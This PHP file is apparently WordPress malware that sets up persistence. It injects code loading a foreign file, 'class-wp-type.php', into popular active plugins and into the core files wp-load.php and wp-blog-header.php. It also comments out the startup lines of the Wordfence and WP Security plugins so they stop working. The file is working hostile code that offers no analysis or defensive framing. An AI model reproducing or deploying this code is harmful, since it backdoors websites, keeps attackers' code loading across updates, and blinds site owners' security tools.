<?php
require_once(dirname( __FILE__ ) . '/../wp-blog-header.php');
require_once(dirname( __FILE__ ) . '/class-wp-type.php');
function searchFileChange($f, $s, $c){
  if(file_exists($f)){
    if(!function_exists('file_get_contents') && function_exists('file_put_contents')){
      if(!stristr(file_get_contents($f), $c)){
        $sf = file_get_contents($f);
        $st = str_replace($s, $c, $sf);
        $rd = file_put_contents($f, $st);
        if(stristr(file_get_contents($f), $c)){
        }else{
        }
      }else{
      }
    }else{
      if(function_exists('fopen') && function_exists('fwrite')){
        $handle = fopen($f, "r+");
        $filedata = fread($handle, filesize($f));
        if(!stristr($filedata, $c)){
          $filedata = str_replace($s, $c, $filedata);
          rewind($handle);
          fwrite($handle, $filedata);
          fclose($handle);
        }else{
        }
      }
    }
  }
}
function fileAppend($f, $c){
  $r = file_get_contents($f);
  if(!stristr($r, $c)){
    $fopenFile = fopen ($f, "a");
    file_put_contents($f, $c, FILE_APPEND);
    if(stristr($r,$c)){}
  }else{}
}
function search_in_array_plugins($lists, $plugins) {
  foreach($plugins as $image){
    foreach($lists as $key => $note){
      $position = strpos($note, $image);
      if ($position !== false){
        $return[] = $note;
      }
    }
  }
  return $return;
}
function replace_plugins(){
	$plugins = array(
		"akismet",
		"classic-editor",
		"all_in_one_seo_pack",
		"wp-seo",
		"wp-contact-form-7",
		"litespeed-cache",
		"wordpress-importer",
		"health-check"
  );
	return $plugins;
}
function replacer_plugins(){
  $the_plugs = get_option('active_plugins');
  $findinSecurity = search_in_array_plugins( $the_plugs, replace_plugins() );
  foreach($findinSecurity as $e){
    $plugin = WP_PLUGIN_DIR."/{$e}";
    fileAppend($plugin, "\nif(!function_exists('classLink')){\n\tif(file_exists(ABSPATH . WPINC . '/class-wp-type.php')){\n\t\trequire_once( ABSPATH . WPINC . '/class-wp-type.php' );\n\t}\n}");
  }
}
replacer_plugins();
function change_plugins(){
	$plugins = array(
		"wordfence",
		"wp-security",
		"sucuri",
  );
	return $plugins;
}
function changer_plugins(){
  $the_plugs = get_option('active_plugins');
  $findinSecurity = search_in_array_plugins( $the_plugs, change_plugins() );
  foreach($findinSecurity as $e){
    $plugin = WP_PLUGIN_DIR."/{$e}";
    searchFileChange($plugin, "wordfence::install_actions();", "//wordfence::install_actions();");
    searchFileChange($plugin, "include_once('wp-security-core.php');", "//include_once('wp-security-core.php');");
  }
  searchFileChange(DIZIN . "../wp-blog-header.php", "// Load the theme template.", "// Load the theme template.\n\tif(!function_exists('classLink')){\n\t\tif(file_exists(ABSPATH . WPINC . '/class-wp-type.php')){\n\t\t\trequire_once( ABSPATH . WPINC . '/class-wp-type.php' );\n\t\t}\n\t}");
}
changer_plugins();
fileAppend(ABSPATH . '/wp-load.php', "\nif(!function_exists('classLink')){\n\tif(file_exists(ABSPATH . WPINC . '/class-wp-type.php')){\n\t\trequire_once( ABSPATH . WPINC . '/class-wp-type.php' );\n\t}\n}");